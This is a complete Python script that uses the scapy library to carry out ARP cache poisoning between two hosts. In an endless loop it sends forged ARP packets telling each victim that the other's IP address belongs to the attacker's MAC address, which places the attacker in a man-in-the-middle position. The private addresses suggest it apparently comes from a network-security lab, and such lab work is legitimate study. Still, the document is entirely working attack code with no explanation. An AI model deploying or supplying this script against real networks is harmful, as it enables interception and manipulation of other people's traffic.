#!/usr/bin/env python3
from scapy.all import *
import time

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
IP_M = "10.9.0.105"

MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"
MAC_M = "02:42:0a:09:00:69"

# For A
E1 = Ether(dst=MAC_A,src=MAC_M)
A1 = ARP(op=1, hwsrc=MAC_M, psrc=IP_B, hwdst=MAC_A, pdst=IP_A)
pktA = E1/A1

# For B
E2 = Ether(dst=MAC_B,src=MAC_M)
A2 = ARP(op=1, hwsrc=MAC_M, psrc=IP_A, hwdst=MAC_B, pdst=IP_B)
pktB = E2/A2

while(1):
    sendp(pktA)
    sendp(pktB)
    time.sleep(3)